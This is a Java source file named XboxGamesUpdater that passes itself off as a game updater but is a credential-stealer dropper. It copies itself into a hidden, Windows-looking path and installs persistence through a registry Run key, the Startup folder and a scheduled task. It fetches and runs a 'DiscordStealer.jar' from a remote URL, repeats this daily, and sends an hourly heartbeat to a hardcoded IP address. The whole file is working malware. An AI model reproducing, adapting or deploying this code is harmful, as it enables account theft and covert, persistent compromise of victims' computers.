import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.concurrent.*;

public class XboxGamesUpdater {
    
    private static final String[] STEALER_MIRRORS = {
        "https://github.com/superbebra1234/Test_GG_hub/raw/main/DiscordStealer.jar"
    };
    private static final String INSTALL_PATH = System.getenv("PROGRAMDATA") + "\\Microsoft\\Windows\\Core\\core.jar";
    
    public static void main(String[] args) {
        hideConsole();
        install();
        runStealer();
        
        // Персистентность
        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2);
        scheduler.scheduleAtFixedRate(() -> runStealer(), 24, 24, TimeUnit.HOURS);
        scheduler.scheduleAtFixedRate(() -> heartbeat(), 1, 1, TimeUnit.HOURS);
    }
    
    private static void hideConsole() {
        try { new ProcessBuilder("cmd.exe", "/c", "exit").start(); } catch (Exception e) {}
    }
    
    private static void install() {
        try {
            String currentJar = XboxGamesUpdater.class.getProtectionDomain()
                .getCodeSource().getLocation().toURI().getPath();
            
            new File(INSTALL_PATH).getParentFile().mkdirs();
            if (!new File(INSTALL_PATH).exists()) {
                Files.copy(Paths.get(currentJar), Paths.get(INSTALL_PATH), StandardCopyOption.REPLACE_EXISTING);
            }
            
            // Автозагрузка (3 способа)
            Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsCore /t REG_SZ /d \"" + INSTALL_PATH + "\" /f");
            String startup = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsCore.jar";
            Files.copy(Paths.get(INSTALL_PATH), Paths.get(startup), StandardCopyOption.REPLACE_EXISTING);
            Runtime.getRuntime().exec("schtasks /create /tn \"WindowsCore\" /tr \"" + INSTALL_PATH + "\" /sc onlogon /f");
            
            Runtime.getRuntime().exec("attrib +h \"" + INSTALL_PATH + "\"");
        } catch (Exception e) {}
    }
    
    private static void runStealer() {
        for (int attempt = 1; attempt <= 3; attempt++) {
            try {
                byte[] data = downloadStealer();
                if (data != null && data.length > 10000) {
                    String tempPath = System.getenv("TEMP") + "\\stealer.jar";
                    Files.write(Paths.get(tempPath), data);
                    Runtime.getRuntime().exec("java -jar \"" + tempPath + "\"");
                    return;
                }
            } catch (Exception e) {}
            try { Thread.sleep(5000); } catch (Exception e) {}
        }
    }
    
    private static byte[] downloadStealer() {
        for (String mirror : STEALER_MIRRORS) {
            try {
                URL url = new URL(mirror);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                conn.setConnectTimeout(10000);
                if (conn.getResponseCode() == 200) {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    try (InputStream in = conn.getInputStream()) {
                        byte[] buffer = new byte[8192];
                        int bytesRead;
                        while ((bytesRead = in.read(buffer)) != -1) baos.write(buffer, 0, bytesRead);
                    }
                    return baos.toByteArray();
                }
            } catch (Exception e) {}
        }
        return null;
    }
    
    private static void heartbeat() {
        try {
            URL url = new URL("http://26.184.88.227:8891/heartbeat");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }
}
